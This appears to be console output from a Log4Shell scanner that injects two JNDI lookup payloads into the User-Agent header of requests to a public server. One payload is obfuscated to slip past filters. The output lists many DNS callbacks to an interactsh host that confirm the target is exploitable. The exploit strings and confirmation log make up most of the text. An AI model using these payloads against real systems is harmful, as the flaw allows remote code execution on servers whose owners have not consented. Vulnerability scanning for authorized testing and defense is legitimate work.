[*] Current configuration
    [•] Enable proxy http://127.0.0.1:8080 successfully!
    [•] Payload injection mode: Injects each payloads to headers and data sequently.
    [•] Thread: 10
    [•] Excluded headers: connection, content-length, host, accept, accept-encoding, accept-language

[*] Loaded payload list
    [•] log4j_cve11:        ${jndi:ldap://${hostName}.origin.__param__.__interactsh_url__}
    [•] log4j_cve22:        ${jn${::::::-d}i:l${::::::-d}ap://${::::::-x}${::::::-f}.__param__.__interactsh_url__/a}


====================================================================================================================================================================================


[*] Request details
    [•] URL: http://13.250.112.201:8001/
    [•] Method: POST
    [•] Headers added: User-Agent

[*] Registered interactsh successfully
    [•] Interact URL: rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh

[*] Waiting for a response(up to 20 seconds)...

[*] Detect log4j vulnerability
[*] Polled results from the interact server:

ID: 1   | Time: 2022-03-04T05:04:47.587610758Z   | Type: dns   | IP: 3.0.5.229        | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 14  | Time: 2022-03-04T05:04:48.208307696Z   | Type: dns   | IP: 13.229.187.207   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 15  | Time: 2022-03-04T05:04:48.208871886Z   | Type: dns   | IP: 18.140.177.41    | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 16  | Time: 2022-03-04T05:04:48.434868381Z   | Type: dns   | IP: 13.229.187.194   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 17  | Time: 2022-03-04T05:04:48.43592669Z    | Type: dns   | IP: 13.229.187.207   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 18  | Time: 2022-03-04T05:04:48.43664946Z    | Type: dns   | IP: 3.0.5.231        | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 19  | Time: 2022-03-04T05:04:48.437840063Z   | Type: dns   | IP: 13.250.186.208   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 20  | Time: 2022-03-04T05:04:48.440245689Z   | Type: dns   | IP: 13.250.186.208   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 21  | Time: 2022-03-04T05:04:48.441709684Z   | Type: dns   | IP: 13.229.187.213   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 22  | Time: 2022-03-04T05:04:48.443673786Z   | Type: dns   | IP: 3.0.5.231        | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 23  | Time: 2022-03-04T05:04:48.449959615Z   | Type: dns   | IP: 13.229.187.207   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 24  | Time: 2022-03-04T05:04:48.579052912Z   | Type: dns   | IP: 13.250.186.208   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 25  | Time: 2022-03-04T05:04:48.579592014Z   | Type: dns   | IP: 13.229.187.194   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 26  | Time: 2022-03-04T05:04:48.585674018Z   | Type: dns   | IP: 13.229.187.207   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 27  | Time: 2022-03-04T05:04:48.587775059Z   | Type: dns   | IP: 13.250.186.208   | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
ID: 28  | Time: 2022-03-04T05:04:48.594212775Z   | Type: dns   | IP: 3.0.5.231        | Param: User-Agent     |  Payload Code: log4j_cve22 | Host: xf.User-Agent.log4j_cve22.rxr7hwxx17y1hm91vybc69d65666g8btr.interact.sh
